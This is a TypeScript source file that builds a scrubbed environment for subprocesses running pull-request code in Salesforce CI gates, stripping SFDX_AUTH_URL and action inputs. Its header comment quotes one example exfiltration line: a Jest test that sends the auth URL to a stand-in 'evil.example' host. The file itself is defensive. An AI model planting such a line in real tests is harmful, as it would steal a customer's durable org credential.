// THE ENVIRONMENT HANDED TO A SUBPROCESS THAT RUNS PR-AUTHORED CODE.
//
// THE ATTACK THIS EXISTS TO STOP, stated plainly because the wrong control was chosen once
// already. Two Salesforce gates spawn tools that execute or parse code the branch under gate
// wrote: `salesforce-lwc-jest` runs the PR's own Jest test files, and
// `salesforce-code-analyzer` runs ESLint and PMD over the PR's own sources (ESLint loads a
// project's config and plugins, which is code). The gate stage's own process holds
// `SFDX_AUTH_URL` so that org.ts can log in -- and an sfdx auth URL is a DURABLE REFRESH TOKEN
// for the customer's Salesforce org, not a session token. `runCommand` (gates/exec.ts) passes
// `env` to execFile only when the caller supplies one, so a caller that supplies nothing hands
// the child the whole of `process.env` by inheritance. A PR could therefore commit
//
//     it('x', async () => { await fetch('https://evil.example/' + process.env.SFDX_AUTH_URL); });
//
// and the gate would exfiltrate the org credential and then report `pass`.
//
// WHY `redactSecrets` IS NOT THE ANSWER. org.ts's redactor scrubs a credential out of FINDINGS,
// which stops disclosure into a PR comment. It does nothing about a subprocess that reads the
// variable and sends it over the network. Those are different threats and need different
// controls; this file is the second one. Both are needed, and neither substitutes for the
// other.
//
// DENY BY DEFAULT, RE-ADD BY NAME. The list of variables a Salesforce tool legitimately needs is
// short and knowable; the list of secrets a runner might be holding is neither, and grows every
// time someone adds an input. So everything in the two dangerous namespaces is dropped and only
// the specific non-secret settings the analyser needs are put back.

// Variables the Salesforce CLI and its plugins read. `SFDX_AUTH_URL` lives here, and so does
// every future auth variable someone adds -- which is the point of matching the PREFIX rather
// than listing today's secrets.
const SALESFORCE_NAMESPACE = /^SF_|^SFDX_/i;

// The action's own inputs, which GitHub exports as `INPUT_*`. On the gate step these carry the
// tenant's VCS token (`INPUT_VCS-HOST-CONFIG`), the coding-executor credential
// (`INPUT_CODING-EXECUTOR-CONFIG`) and the grant verification key. No analysis tool has any use
// for them, and a linter running under the PR's own config has no business being able to read
// them.
const ACTION_INPUT_NAMESPACE = /^INPUT_/i;

// The only Salesforce variables put back: all of them locate the provisioned toolchain or turn
// off network chatter. None is a credential, and the analyser cannot find its own plugin
// without the first three (provision-cli.ts installs under exactly these paths).
const TOOLCHAIN_SETTINGS: readonly string[] = [
  'SF_CONFIG_DIR',
  'SF_DATA_DIR',
  'SF_CACHE_DIR',
  'SF_DISABLE_TELEMETRY',
  'SF_AUTOUPDATE_DISABLE',
  'SF_SKIP_NEW_VERSION_CHECK',
];

// Build the environment for a subprocess that will run or parse PR-authored code.
//
// Note what is deliberately NOT attempted: a general secret scrubber. The ambient CI
// environment stays, because a tool that cannot see `PATH`, `HOME` or `NODE_OPTIONS` does not
// run at all, and pretending to have solved the general problem would be worse than solving
// the specific one.
//
// WHAT ACTUALLY REMAINS, named precisely rather than hand-waved. There is no `GITHUB_TOKEN` in
// a gate stage to worry about: .github/workflows/runner.yml sets only `AUTOPILOT_TENANT_ID` at
// job level, the gate step adds four `INPUT_*` values plus `SFDX_AUTH_URL` (all dropped here),
// and `actions/checkout` runs with `persist-credentials: false` so the customer PAT is wiped
// from .git/config rather than left in the environment. The real residual is GitHub's own
// job-scoped plumbing -- `ACTIONS_RUNTIME_TOKEN`, `ACTIONS_RESULTS_URL` and friends -- which
// authorises writing to THIS job's cache and artifacts and expires with the job. That is a
// genuine capability handed to branch-authored code, and it is a smaller one than a durable
// org refresh token: its blast radius is this run's own cache entries, not a customer's
// Salesforce org. Narrowing it further is GitHub's job, not this function's.
//
// What this guarantees is narrow and real: the Salesforce org credential and the action's own
// inputs are not reachable from a subprocess running the branch's code.
export function scrubbedSubprocessEnv(source: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv {
  const scrubbed: NodeJS.ProcessEnv = {};
  for (const [name, value] of Object.entries(source)) {
    if (SALESFORCE_NAMESPACE.test(name) || ACTION_INPUT_NAMESPACE.test(name)) continue;
    scrubbed[name] = value;
  }
  for (const name of TOOLCHAIN_SETTINGS) {
    const value = source[name];
    if (value !== undefined) scrubbed[name] = value;
  }
  return scrubbed;
}
